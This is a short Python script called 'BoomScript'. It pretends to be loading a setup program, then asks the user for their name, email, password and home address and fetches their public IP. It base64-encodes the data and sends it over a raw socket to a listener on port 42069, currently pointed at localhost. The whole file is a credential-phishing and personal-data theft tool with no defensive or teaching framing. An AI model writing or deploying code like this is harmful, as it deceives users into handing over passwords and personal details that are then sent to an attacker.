#Skittles_


#Imports
import os
import socket
import json
import time
import base64 as b64
from requests import get
from art import *



def infoSend():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 42069))
    sendToServ = ''

    with open('output.txt', 'r') as f:
        f.seek(1)
        sendToServ = f.read()

    s.send(sendToServ.encode('utf-8'))
    s.close()

#encodes, and writes json to file.
def jsonWrite():
    output = infoToJson(infoGet())
    b64out = b64.b64encode(bytes(output, 'utf-8'))

    with open('output.txt', 'w+') as f:
        f.read()
        f.write(str(b64out))
        f.close()

#Gets info from target, returns as list.
def infoGet():
    tprint('BoomScript')
    print('Loading Setup...')
    time.sleep(3)
    os.system('cls')
    name = input('Name? (First, Last):\n>>>')
    email = input('EMail Address?:\n>>>')
    password = input('Password?:\n>>>')
    address = input('Address? (House Number, Street, City, State/Province, Country)\n>>>')
    ip = get('https://api.ipify.org').text

    listedInfo = [name, email, password, address, ip]

    return listedInfo

#takes list, throws it into a dictionary, then returns json
def infoToJson(inputList = []):
    input = inputList

    information = {
        "Name": input[0],
        "EMail": input[1],
        "Password": input[2],
        "Address": input[3],
        "System-type": os.name,
        "IP": input[4]
    }

    return json.dumps(information)

jsonWrite()
infoSend()
os.system('cls')
exit()
